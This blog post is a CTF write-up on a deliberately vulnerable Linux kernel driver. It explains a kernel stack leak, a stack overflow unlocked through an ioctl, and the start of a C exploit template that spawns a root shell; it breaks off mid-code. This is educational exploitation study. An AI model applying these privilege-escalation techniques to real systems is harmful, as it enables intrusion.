<!DOCTYPE html>
<html>
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1">
    <title>Easy_Kernel Writeup from K3RN3LCTF 2021 - x3ero0&#39;s blog</title>
    <link rel="shortcut icon" href="/img/favicon.ico">
    <style type="text/css">
        img.wp-smiley,
        img.emoji {
            display: inline !important;
            border: none !important;
            box-shadow: none !important;
            height: 1em !important;
            width: 1em !important;
            margin: 0 .07em !important;
            vertical-align: -0.1em !important;
            background: none !important;
            padding: 0 !important;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css" integrity="sha256-mmgLkCYLUQbXn0B1SRqzHar6dCnv9oZFPEC1g1cwlkk=" crossorigin="anonymous">
    <link rel='stylesheet' href='/css/custom.css' type='text/css' media='all' />
    <link rel='stylesheet' href='/css/style.css' type='text/css' media='all' />
    <link rel='stylesheet' href='/css/syntax.css' type='text/css' media='all' />
    <link rel='stylesheet' href='/css/general.css' type='text/css' media='all' />
    <link rel='stylesheet' href='/css/toc.css' type='text/css' media='all' />
    <link rel='stylesheet' href='/css/image.css' type='text/css' media='all' />
</head>

    <body class="two-column">
        <a href="#content">Skip to content</a>
<div class="wrapper">
    <header role="banner" class="banner widgets columns-1">
        <a href="/" rel="home">
            <h1 class="site">x3ero0&#39;s blog</h1>
            <p></p>
        </a>
        <nav role="navigation" aria-label="Primary Navigation">

            <ul class="menu">
                <li class="menu-item "><a class="menu__link" href="/">HOME</a></li>
                <li class="menu-item "><a class="menu__link" href="/posts/">POSTS</a></li>
                <li class="menu-item "><a class="menu__link" href="/crackmes/">CRACKMES</a></li>
            </ul>
            <select onChange="location.href=value;">
                <option value="/" class="menu-item menu-item-type-custom menu-item-object-custom" >HOME</option>
                <option value="/posts/" class="menu-item menu-item-type-custom menu-item-object-custom" >POSTS</option>
                <option value="/crackmes/" class="menu-item menu-item-type-custom menu-item-object-custom" >CRACKMES</option>
            </select>
        </nav>
    </header>

    <br>
    <div style="width: 100%; max-height: 100px; text-align: center;">
       
</div>

    <div class="breadcrumbs">
        
    </div>

        <div id="content" class="content">

<main role="main">
    <article role="article" class="post type-post format-standard hentry">
        <header class="post-header">
            <h1>Easy_Kernel Writeup from K3RN3LCTF 2021</h1>
            <div class="post-details">
                <a rel="bookmark">
                    <time datetime="2021-11-14T1114:413:206">2021-11-14</time>
                </a>
				
<span style="float: right;">
    <div id="fb-root" style="height: 100%;"></div>
    
    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.2"></script>
    
    <div class="fb-share-button" data-href="https://x3ero0.github.io/posts/easy_kernel_exploitation/" data-layout="button_count" data-size="small">
        <a target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fx3ero0.github.io%2fposts%2feasy_kernel_exploitation%2f" class="fb-xfbml-parse-ignore">Share</a>
    </div>
    &nbsp;
    <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-text="Easy_Kernel Writeup from K3RN3LCTF 2021" data-url="https://x3ero0.github.io/posts/easy_kernel_exploitation/" data-show-count="false">Tweet</a>
    <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
    &nbsp;
    
</span>

            </div>
        </header>

        <div class="post-content">
            <ul>
<li>Author : <a href="https://seal9055.com/">Seal</a> <a href="https://twitter.com/seal9055">Twitter</a></li>
<li>CTF : <a href="https://ctftime.org/event/1438">K3RN3LCTF</a></li>
<li>Files: <a href="https://github.com/X3eRo0/Challenges/blob/master/K3RN3L4RMY_CTF/Pwn/eazy_kernel/easy_kernel.tar.gz?raw=true">easy_kernel.tar.gz</a></li>
<li>Platform : Linux Kernel 5.4.0 (KASLR, SMEP, SMAP, KPTI)</li>
</ul>


<br>

<p>It&rsquo;s been a while, huh?</p>
<p>Today, we will dive into the basics of Linux Kernel Exploitation.
I am not very experienced when it comes to Linux Kernel Exploitaion and
I am still learning. So, I am writing about the challenge I solved this
weekend in <a href="https://ctftime.org/event/1438">K3RN3LCTF 2021</a>.</p>
<h3 id="first-look">First Look</h3>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/firstlook.png"
    alt="First look of the Challenge"
    decoding="async"
  />
</div>
<p>We have a bunch of files to work with. Let&rsquo;s first understand what each file actually does</p>
<ul>
<li><strong>bzImage</strong> - (short for Big ZImage) it is the compressed Linux Kernel.</li>
<li><strong>fs</strong> - Uncompressed file system root directory for the VM.</li>
<li><strong>initramfs.cpio.gz</strong> - Compressed file system for the VM.</li>
<li><strong>launch.sh</strong> - Bash script to run the VM.</li>
<li><strong>rebuild_fs.sh</strong> - Bash script to get compressed initramfs.cpio.g from the &ldquo;fs&rdquo; folder.</li>
<li><strong>vuln.ko</strong> - Vulnerable Linux Kernel Driver.</li>
</ul>
<p>The first thing we need to do is figure out what&rsquo;s going on in the Vulnerable Driver.</p>
<h3 id="what-is-a-kernel-driver">What is a kernel driver?</h3>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/meme.png"
    alt="bruh moment"
    decoding="async"
  />
</div>
<p>Before we dive into reverse engineering the kernel driver, first let&rsquo;s understand
what is a Linux Kernel Driver.</p>
<p>A Linux kernel driver is a specific type of program that allows
hardware and software to work together to accomplish a task. Whenever you
try to print a document, a kernel driver handles your request and sends it
to the actual printer. it simply acts like a medium between the Operating System and
the hardware.</p>
<p>In linux each kernel driver has to register a device file, which is used by
the userland programs to interact with the driver. For example, whenever you
redirect some output to &ldquo;/dev/null&rdquo; you are interacting with the kernel driver.</p>
<p>These drivers are called <a href="https://en.wikipedia.org/wiki/Device_file#Character_devices">&quot;<em>character special device</em>&quot;</a>.</p>
<p>Okay, but how do I interact with a kernel driver?</p>
<p>Your userland program can interact with the kernel driver by first getting a handle to it.
Now, with that handle you can do read/write/ioctl syscalls to read and write data from the driver.</p>
<p>Example:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">get_random_bytes</span>(){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>    
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>    <span style="color:#6272a4">/* get handle to /dev/urandom */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>    <span style="color:#8be9fd">int</span> fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;/dev/urandom&#34;</span>, O_RDONLY);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>    <span style="color:#8be9fd">int</span> random_bytes <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>    <span style="color:#6272a4">/* read random bytes on stack variable */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>    read(fd, <span style="color:#ff79c6">&amp;</span>random_bytes, <span style="color:#ff79c6">sizeof</span>(random_bytes));
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>    <span style="color:#6272a4">/* return random bytes */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>    <span style="color:#ff79c6">return</span> random_bytes;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>}
</code></pre></div><p>The above function interacts with the driver for &ldquo;/dev/urandom&rdquo; to get
some random bytes.</p>
<p>So each kernel driver implements a bunch of device functions like -</p>
<ul>
<li>device_open - called whenever a program tries to open the device using SYS_open.</li>
<li>device_read - called whenever a program does a SYS_read on the device&rsquo;s fd.</li>
<li>device_write - called whenever a program does a SYS_write on the device&rsquo;s fd.</li>
<li>device_release - called whenever a program does a SYS_close on the device&rsquo;s fd.</li>
</ul>
<p>If you are not familiar with linux kernels please skim through this cool <a href="https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234">article</a>
The gist is that you interact with the driver by doing syscalls.</p>
<p>Now let&rsquo;s try to reverse engineer what the vulnerable driver is doing.</p>
<h2 id="reversing-vulnko">Reversing Vuln.ko</h2>
<p>Okay, Let&rsquo;s open the driver in IDA Pro.
A kernel driver does not have a main function, we have to reverse the individual
device functions.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/functions.png"
    alt="function list"
    decoding="async"
  />
</div>
<p>Let&rsquo;s start with sopen function.</p>
<h3 id="sopen">sopen</h3>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/sopen.png"
    alt="open_function"
    decoding="async"
  />
</div>
<p>This function just prints &ldquo;Device opened&rdquo;.</p>
<h3 id="sread">sread</h3>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/sread.png"
    alt="read_function"
    decoding="async"
  />
</div>
<p>This function writes the string &ldquo;<strong>Welcome to this kernel pwn series</strong>&rdquo; on the kernel stack variable
and then <strong>nbytes</strong> number of bytes are copied to the userland buffer with the <strong>copy_user_generic_unrolled()</strong> function.</p>
<p>What this means is that if we did a <strong>SYS_read</strong> on the device&rsquo;s fd we would get the string &ldquo;<strong>Welcome to this kernel pwn series\x00</strong>&rdquo; in our buffer.</p>
<p>One thing to note here is that the user controls how many bytes to read and the memory that is being copied is the Kernel Stack.
This is a Memory Leak Vulnerability, because user can read arbitrary amount of bytes from the kernel stack, which may contain kernel pointers.</p>
<p>So, we mark <strong>sread</strong> function as vulnerable and move to the next function.</p>
<h3 id="swrite">swrite</h3>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/swrite.png"
    alt="write_function"
    decoding="async"
  />
</div>
<p>This function copies the data from <strong>userland_buffer</strong> to the stack variable on the kernel stack.
It only copies the first <strong>nbytes</strong> number of bytes only if <strong>nbytes</strong> is smaller than <strong>MaxBuffer</strong>, which is a global variable in the driver.
nbytes is again user controlled and it leads to Kernel Stack Buffer Overflow Vulnerability.</p>
<p>This function has a bound check, which checks if <strong>nbytes</strong> is smaller than <strong>MaxBuffer</strong>
<strong>MaxBuffer</strong> is initialized with 0x40.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/maxbuffer.png"
    alt="ioctl_function"
    decoding="async"
  />
</div>
<p>The buffer size is 128 bytes and MaxBuffer is only 0x40. so, we cannot send more than 0x40 bytes.
If we could modify MaxBuffer in someway we may be able to corrupt the stack.</p>
<h3 id="sioctl">sioctl</h3>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/sioctl.png"
    alt="ioctl_function"
    decoding="async"
  />
</div>
<p>This function is a special function and is invoked when user does an SYS_ioctl syscall.
SYS_ioctl syscall allows you to send commands to the kernel driver.</p>
<p>in the sioctl function above you can see there are only 2 commands.</p>
<ul>
<li>#16 - just prints the value you pass to it.</li>
<li>#32 - sets the global variable <strong>MaxBuffer</strong> to the value you pass to it.</li>
</ul>
<p>and if you remember <strong>MaxBuffer</strong> is the cap on the number of bytes we can write on kernel stack of <strong>swrite</strong> function.
by using this ioctl we can modify the value of <strong>MaxBuffer</strong> which enables us to currupt Stack.</p>
<h3 id="writing-your-first-kernel-exploit">Writing your first Kernel Exploit</h3>
<p>I will be using the <a href="https://www.musl-libc.org/how.html">musl-libc</a> instead of glibc because in kernel exploitation challenges
sometimes the author does not let you upload the exploit in a sane way so you have to send
the exploit using the base64encode-&gt;paste to a file-&gt;base64decode method. So, it helps when
the total size of the binary is small.</p>
<p>I was using glibc for this challenge initially but after completing the exploit, i was not able to upload the binary
because the session timed out before i could finish pasting the base64 encoded text.</p>
<p>Before we start writing the exploit, we first need a few helper functions that will come in handy while debugging.</p>
<p>This is the exploit template i used.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdint.h&gt;</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt;</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;signal.h&gt;</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt; </span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/mman.h&gt;</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/syscall.h&gt;</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/types.h&gt;</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/stat.h&gt;</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/ioctl.h&gt;</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14</span><span style="color:#ff79c6"></span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15</span><span style="color:#ff79c6">#if HAVE_STROPTS_H
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stropts.h&gt;</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17</span><span style="color:#ff79c6">#endif
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18</span><span style="color:#ff79c6"></span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19</span><span style="color:#8be9fd">char</span> exploit[<span style="color:#bd93f9">0x1000</span>]; <span style="color:#6272a4">/* exploit buffer */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20</span>uint64_t counter <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#6272a4">/* counter */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21</span><span style="color:#8be9fd">int</span> fd <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;           <span style="color:#6272a4">/* file descriptor for pwn_device */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23</span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> user_cs, user_ss, user_rflags, user_sp;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25</span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">save_state</span>(){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26</span>    <span style="color:#ff79c6">__asm</span> {linenos<span style="color:#ff79c6">=</span><span style="color:#ff79c6">inline</span>}__(
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27</span>        <span style="color:#f1fa8c">&#34;.intel_syntax noprefix;&#34;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28</span>        <span style="color:#f1fa8c">&#34;mov user_cs, cs;&#34;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29</span>        <span style="color:#f1fa8c">&#34;mov user_ss, ss;&#34;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30</span>        <span style="color:#f1fa8c">&#34;mov user_sp, rsp;&#34;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31</span>        <span style="color:#f1fa8c">&#34;pushf;&#34;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32</span>        <span style="color:#f1fa8c">&#34;pop user_rflags;&#34;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33</span>        <span style="color:#f1fa8c">&#34;.att_syntax;&#34;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34</span>    );
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35</span>    puts(<span style="color:#f1fa8c">&#34;[*] Saved state&#34;</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36</span>}
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38</span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">get_shell</span>(<span style="color:#8be9fd">void</span>){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39</span>    puts(<span style="color:#f1fa8c">&#34;[*] Returned to userland&#34;</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40</span>    <span style="color:#ff79c6">if</span> (getuid() <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41</span>        printf(<span style="color:#f1fa8c">&#34;[*] UID: %d, got root!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, getuid());
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42</span>        system(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43</span>    } <span style="color:#ff79c6">else</span> {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44</span>        printf(<span style="color:#f1fa8c">&#34;[!] UID: %d, didn&#39;t get root</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, getuid());
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45</span>        exit(<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46</span>    }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47</span>}
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49</span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">hexdump</span>(<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">void</span><span style="color:#ff79c6">*</span> data, size_t size) {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50</span>    <span style="color:#8be9fd">char</span> ascii[<span style="color:#bd93f9">17</span>];
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51</span>    size_t i, j;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52</span>    ascii[<span style="color:#bd93f9">16</span>] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;\0&#39;</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53</span>    <span style="color:#ff79c6">for</span> (i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> size; <span style="color:#ff79c6">++</span>i) {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54</span>        printf(<span style="color:#f1fa8c">&#34;%02X &#34;</span>, ((<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)data)[i]);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55</span>        <span style="color:#ff79c6">if</span> (((<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)data)[i] <span style="color:#ff79c6">&gt;=</span> <span style="color:#f1fa8c">&#39; &#39;</span> <span style="color:#ff79c6">&amp;&amp;</span> ((<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)data)[i] <span style="color:#ff79c6">&lt;=</span> <span style="color:#f1fa8c">&#39;~&#39;</span>) {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56</span>            ascii[i <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">16</span>] <span style="color:#ff79c6">=</span> ((<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)data)[i];
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57</span>        } <span style="color:#ff79c6">else</span> {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58</span>            ascii[i <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">16</span>] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;.&#39;</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59</span>        }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60</span>        <span style="color:#ff79c6">if</span> ((i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">||</span> i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> size) {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61</span>            printf(<span style="color:#f1fa8c">&#34; &#34;</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62</span>            <span style="color:#ff79c6">if</span> ((i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">16</span> <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63</span>                printf(<span style="color:#f1fa8c">&#34;|  %s </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, ascii);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64</span>            } <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> size) {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65</span>                ascii[(i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">16</span>] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;\0&#39;</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66</span>                <span style="color:#ff79c6">if</span> ((i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">16</span> <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">8</span>) {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67</span>                    printf(<span style="color:#f1fa8c">&#34; &#34;</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68</span>                }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69</span>                <span style="color:#ff79c6">for</span> (j <span style="color:#ff79c6">=</span> (i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">16</span>; j <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">16</span>; <span style="color:#ff79c6">++</span>j) { printf(<span style="color:#f1fa8c">&#34;   &#34;</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70</span>                }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71</span>                printf(<span style="color:#f1fa8c">&#34;|  %s </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, ascii);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72</span>            }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73</span>        }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74</span>    }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75</span>}
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78</span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">telescope</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span> buffer, <span style="color:#8be9fd">int</span> size){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79</span>    size <span style="color:#ff79c6">=</span> size <span style="color:#ff79c6">-</span> (size <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">8</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80</span>    <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> size; i<span style="color:#ff79c6">+=</span><span style="color:#bd93f9">8</span>){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81</span>        printf(<span style="color:#f1fa8c">&#34;[0x%.3x] 0x%.16lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, i, <span style="color:#ff79c6">*</span>(uint64_t <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>buffer[i]);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82</span>    }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83</span>}
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85</span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">s08</span>(<span style="color:#8be9fd">char</span> a, <span style="color:#8be9fd">int</span> len){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86</span>    <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> len; i<span style="color:#ff79c6">++</span>){
